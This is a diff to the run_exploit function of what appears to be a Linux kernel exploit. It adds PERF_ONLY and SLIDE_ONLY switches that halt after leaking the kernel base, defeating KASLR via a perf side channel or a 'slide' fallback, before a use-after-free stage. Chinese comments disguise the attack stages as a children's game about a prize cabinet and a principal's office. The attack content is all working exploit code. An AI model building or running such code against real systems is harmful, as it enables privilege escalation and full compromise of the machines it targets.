@@ -232,6 +232,8 @@ int run_exploit(int argc, char **argv) {
   pin_to_core(CORE);
   /* 【第 1 关】先试"偷看奖品柜玻璃反光"(perf 侧信道)；不行再用
    * "传话纸条背面墨痕"(slide 路线) 拼出园长办公室门牌号 */
+  char *perf_only = getenv("PERF_ONLY");
+  int perf_only_mode = perf_only != NULL && strcmp(perf_only, "1") == 0;
   uint64_t text_base = perf_leak_text_base();
   if (text_base) {
     kaslr_base = text_base;
@@ -240,9 +242,27 @@ int run_exploit(int argc, char **argv) {
     pr_success("text-base-ok pid=%d text=%016llx slide=%016llx (perf)\n",
                getpid(), (unsigned long long)kaslr_base,
                (unsigned long long)kaslr_slide);
+  } else if (perf_only_mode) {
+    /* 安全阀:PERF_ONLY=1 时只验证 perf 路线,失败也不跑 slide/UAF */
+    pr_warning("perf-only: perf route failed, skipping slide fallback\n");
+    return 1;
   } else if (!slide_leak_kernel_base()) {
     pr_error("kaslr leak failed\n");
     return 1;
+  }
+
+  if (perf_only_mode) {
+    pr_success("perf-only done pid=%d kaslr=%d base=%016zx slide=%016zx\n",
+               getpid(), kaslr_done, kaslr_base, kaslr_slide);
+    return 0;
+  }
+
+  /* 安全阀:SLIDE_ONLY=1 时 KASLR 泄露成功即停,不进 UAF/书包阶段 */
+  char *slide_only = getenv("SLIDE_ONLY");
+  if (slide_only != NULL && strcmp(slide_only, "1") == 0) {
+    pr_success("slide-only done pid=%d kaslr=%d base=%016zx slide=%016zx\n",
+               getpid(), kaslr_done, kaslr_base, kaslr_slide);
+    return 0;
   }
 
   pin_to_core(CORE);
